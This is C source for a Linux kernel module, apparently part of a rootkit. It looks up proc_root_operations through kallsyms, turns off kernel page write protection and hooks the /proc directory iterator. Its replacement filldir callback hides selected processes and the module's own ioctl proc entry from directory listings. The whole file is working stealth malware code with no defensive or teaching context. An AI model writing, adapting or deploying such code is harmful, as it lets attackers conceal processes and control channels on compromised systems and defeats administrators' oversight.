#include "proc_hook.h"

#include <linux/kallsyms.h>
#include <linux/proc_fs.h>

#include "helper.h"
#include "process_hiding.h"
#include "shared.h"

static struct file_operations *proc_root_operations;

typedef int (*t_proc_readdir) (struct file *, struct dir_context *);
static t_proc_readdir orig_proc_readdir = NULL;
static filldir_t orig_proc_filldir = NULL;

/*
 * Hide hidden processes and ioctl file
 */
int hooked_proc_filldir(struct dir_context *ctx, const char *name, int nlen, loff_t off,
                        u64 ino, unsigned x) {

    /* hide processes and ioctl file */
    printk("proc triggered\n");
    if (!strcmp(name, PROC_ENTRY_NAME) || check_hidden_process(name)) {

        /* hide this */
        return 0;
    }

    return orig_proc_filldir(ctx, name, nlen, off, ino, x);
}

// hooked proc readdir
static int hooked_proc_readdir(struct file *fp, struct dir_context *ctx) {

    /*
     * hook proc filldir in dir_context
     */
    orig_proc_filldir = ctx->actor;
    ctx->actor = hooked_proc_filldir;

    return orig_proc_readdir(fp, ctx);
}

int enable_proc_filter(void) {

    unsigned long i;

    /*
     * get proc_root_operations via kallsyms
     */
    if (0 == (i = kallsyms_lookup_name("proc_root_operations"))) {
        return -1;
    }

    unprotect_paging_mode();

    /*
     * hook proc_root_readdir
     */
    proc_root_operations = (struct file_operations *) i;
    orig_proc_readdir = proc_root_operations->iterate_shared;
    proc_root_operations->iterate_shared = hooked_proc_readdir;

    protect_paging_mode();

    return 0;
}

void disable_proc_filter(void) {

    unprotect_paging_mode();

    /*
     * set original proc_root_readdir
     */
    proc_root_operations->iterate_shared = orig_proc_readdir;

    protect_paging_mode();
}